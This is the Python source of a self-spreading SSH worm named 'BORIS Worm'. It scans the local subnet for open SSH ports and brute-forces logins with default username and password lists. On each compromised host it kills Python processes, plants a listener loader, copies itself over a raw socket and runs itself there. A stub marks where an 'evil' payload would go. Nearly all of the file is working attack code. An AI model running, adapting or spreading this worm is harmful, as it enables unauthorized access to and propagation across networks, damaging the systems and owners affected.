#BORIS Worm
#The most boring worm in the world
#Feel free to modify to work as pyinstalled file
#Please hack responsibly.
import socket
import os
import sys
def payload():
    print("Put something evil here")
import time as t
from subprocess import check_output,Popen
try:
    from subprocess import pipe
except:
    from subprocess import PIPE as pipe
import random
try:
    import paramiko
except:
    os.system("mkdir /usr/local/lib")
    os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
    os.system("wget https://bootstrap.pypa.io/get-pip.py")
    os.system("python get-pip.py --user") #grap pip
    os.system("pip install paramiko")
    try:
        import paramiko
    except:
        os.system("curl https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl -o paramiko-2.4.2-py2.py3-none-any.whl")
        os.system("curl https://files.pythonhosted.org/packages/0f/74/ecd13431bcc456ed390b44c8a6e917c1820365cbebcb6a8974d1cd045ab4/pip-10.0.1-py2.py3-none-any.whl -o pip-10.0.1-py2.py3-none-any.whl")
        os.system("wget https://files.pythonhosted.org/packages/0f/74/ecd13431bcc456ed390b44c8a6e917c1820365cbebcb6a8974d1cd045ab4/pip-10.0.1-py2.py3-none-any.whl") #Download the pip wheel
        os.system("wget https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl")
        os.system("python pip-10.0.1-py2.py3-none-any.whl/pip install paramiko-2.4.2-py2.py3-none-any.whl")
        try:
            import paramiko
        except:
            os.system("echo Bailing out. System marked not-vulnerable. > bailed.txt")
            payload()
def getips():
    addrs = []    
    addrs.append([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    return addrs
subnet = []
for ip in getips():
    ip = ip.split(".")[:3]
    ip = ip[0]+"."+ip[1]+"."+ip[2]+"."
    for i in range(1,256):
        subnet.append(ip+str(i))
random.shuffle(subnet)
hackable = []
for i in subnet:
    connect = socket.socket()
    connect.settimeout(1)
    result = connect.connect_ex((i,22))
    if result == 0:
        print("{} is ready for butchering".format(i))
        hackable.append(i)
        continue
    else:
        print("Our high hopes for {} were shattered.".format(i))
        subnet.remove(i)
done = "E"+"O"+"F"
loader = """import socket
s = socket.socket()
s.bind(("0.0.0.0",5555))
s.listen(5)
c,a = s.accept()
while True:
    f = open("worm.py","ab")
    data = c.recv(4096)
    if data!="E"+"O"+"F":
        f.write(data)
    else:
        f.close()
        s.close()
        break
    f.close()
"""
usernames = ["admin","root","guest"]
passwords = ["toor","admin","root","guest","password","letmein"]
for host in hackable:
    ag=0
    for password in passwords:
        for username in usernames:
            sys.stdout.write("{}|{}:{} - Trying{}\r".format(host,username,password,(" "*20)))
            sys.stdout.flush()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(host,port=22,username=username,password=password,timeout=3)
            except paramiko.AuthenticationException:
                ssh.close()
                continue
            except socket.error, e:
                ssh.close()
                continue
            ag = 1
            print("\n[ACCESS GRANTED]")
            print("{}|{}:{}".format(host,username,password))
            break
        if ag==1:
            break
    if ag==1:
        ssh.invoke_shell()
        a,b,c = ssh.exec_command("sh")
        f = open(sys.argv[0],"rb")
        contents = f.read()
        f.close()
        a,b,c=ssh.exec_command("ls")
        if sys.argv[0] in b.read() or "bailed.txt" in b.read():
            ssh.close()
            print("{} is already infected and/or has been noted to be non-vulnerable.".format(host))
            continue
        a,b,c=ssh.exec_command("touch loader.py")
        b.readlines()
        for line in loader.splitlines():
            string = "echo \'{}\' >> loader.py".format(line)
            a,b,c = ssh.exec_command(string)
            b.readlines()
        a,b,c = ssh.exec_command("pkill python")
        b.readlines()
        a,b,c = ssh.exec_command("python loader.py")
        s = socket.socket()
        t.sleep(2) #Prepare to engage
        s.connect((host,5555))
        for line in contents.splitlines():
            s.send(line+"\n")
            t.sleep(0.25)
        s.send(done)
        s.close()
        t.sleep(1)
        b.readlines()
        ssh.exec_command("python worm.py")
    else:
        continue
print("Done")
payload()
